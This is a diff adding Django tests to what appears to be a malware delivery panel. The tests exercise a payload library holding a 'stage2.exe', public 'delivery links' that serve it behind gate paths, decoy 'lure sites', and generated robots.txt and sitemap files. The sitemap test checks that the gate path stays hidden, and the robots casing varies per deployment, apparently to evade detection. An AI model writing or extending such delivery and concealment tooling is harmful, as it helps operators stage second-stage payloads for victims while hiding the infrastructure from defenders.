@@ -3777,3 +3777,102 @@ class TemplateIntegrityTests(TestCase):
         content = response.content.decode()
         self.assertEqual(content.count("<details"), content.count("</details>"))
         self.assertIn("data-autoopen-when", content)
+
+
+@override_settings(AUTO_BAN_THRESHOLD=0)
+class SidebarPaletteLibraryRobotsTests(TestCase):
+    def setUp(self):
+        import shutil
+        import tempfile
+        lib = tempfile.mkdtemp(prefix="rof-lib-")
+        patch = override_settings(PAYLOAD_LIBRARY_DIR=lib)
+        patch.enable()
+        self.addCleanup(patch.disable)
+        self.addCleanup(shutil.rmtree, lib, True)
+        self.operator = Operator.objects.create_user(username="ux2", password="long-enough-password-123")
+        self.client = Client()
+        self.client.force_login(self.operator)
+        self.public = Client()
+        from gates import library
+        folder = library.library_dir() / "vendor"
+        folder.mkdir(parents=True)
+        (folder / "stage2.exe").write_bytes(b"MZ-stage2-bytes")
+        (folder / "notes.md").write_text("# vendor bundle")
+
+    def test_sidebar_scrolls_internally(self):
+        css = open("static/css/panel.css").read()
+        self.assertIn(".primary-nav{flex:1;min-height:0;overflow-y:auto", css)
+
+    def test_command_palette_present(self):
+        response = self.client.get(reverse("overview"))
+        self.assertContains(response, 'id="palette-data"')
+        self.assertContains(response, "js/palette.js")
+        self.assertContains(response, "Delivery Links")
+        self.assertContains(response, "New delivery link")
+
+    def test_link_form_picks_library_payload(self):
+        response = self.client.get(reverse("gate-link-create"))
+        self.assertContains(response, "vendor/stage2.exe")
+        self.client.post(reverse("gate-link-create"), {
+            "path": "/g/lib/one", "kind": "file", "gate_type": "none", "cipher": "none",
+            "placeholder": "blank", "on_deny": "not_found", "library_file": "vendor/stage2.exe",
+            "active": "on",
+        })
+        link = DeliveryLink.objects.get(path="/g/lib/one")
+        self.assertTrue(link.payload)
+        response = follow_download(self.public, "/g/lib/one")
+        self.assertEqual(response.content, b"MZ-stage2-bytes")
+
+    def test_library_upload_still_wins_over_picker(self):
+        self.client.post(reverse("gate-link-create"), {
+            "path": "/g/lib/two", "kind": "file", "gate_type": "none", "cipher": "none",
+            "placeholder": "blank", "on_deny": "not_found",
+            "library_file": "vendor/stage2.exe",
+            "payload": ContentFile(b"UPLOAD-WINS", name="up.exe"), "active": "on",
+        })
+        response = follow_download(self.public, "/g/lib/two")
+        self.assertEqual(response.content, b"UPLOAD-WINS")
+
+    def test_lure_add_from_library(self):
+        site = LureSite.objects.create(name="T", slug="libtest")
+        site.files.create(path="index.html", content="x")
+        self.client.post(reverse("gate-lure-edit", args=[site.pk]),
+                         {"action": "add_from_library", "library_file": "vendor/notes.md"})
+        self.assertTrue(site.files.filter(path="notes.md").exists())
+        # binary rejected
+        self.client.post(reverse("gate-lure-edit", args=[site.pk]),
+                         {"action": "add_from_library", "library_file": "vendor/stage2.exe"})
+        self.assertFalse(site.files.filter(path="stage2.exe").exists())
+
+    def test_robots_and_sitemap_generated_and_stable(self):
+        first = self.public.get("/robots.txt")
+        self.assertEqual(first.status_code, 200)
+        self.assertIn("text/plain", first["Content-Type"])
+        self.assertIn(b"user-", first.content.lower())  # casing varies per deployment
+        again = self.public.get("/robots.txt")
+        self.assertEqual(first.content, again.content)  # seeded: stable per deployment
+        sitemap = self.public.get("/sitemap.xml")
+        self.assertIn("application/xml", sitemap["Content-Type"])
+        self.assertIn(b"<urlset", sitemap.content)
+        self.assertIn(b"<lastmod>", sitemap.content)
+        # never leak the gate base
+        from django.conf import settings as dj_settings
+        self.assertNotIn(dj_settings.GATE_BASE_PATH.encode(), sitemap.content)
+        self.assertNotIn(dj_settings.GATE_BASE_PATH.encode(), first.content)
+
+    def test_robots_lists_lure_paths(self):
+        site = LureSite.objects.create(name="Shop", slug="shop", active=True)
+        site.files.create(path="index.html", content="x")
+        site.files.create(path="css/style.css", content="y")
+        sitemap = self.public.get("/sitemap.xml")
+        self.assertIn(b"/l/shop/index.html", sitemap.content)
+
+    def test_configured_surface_files_never_overwritten(self):
+        from pathlib import Path
+        from django.conf import settings as dj_settings
+        marker = Path(dj_settings.BASE_DIR) / "robots.txt"
+        marker.write_text("User-agent: *\nDisallow: /\n# custom operator file\n")
+        self.addCleanup(marker.unlink)
+        response = self.public.get("/robots.txt")
+        self.assertIn(b"custom operator file", response.content)
+        self.assertIn(b"Disallow: /", response.content)
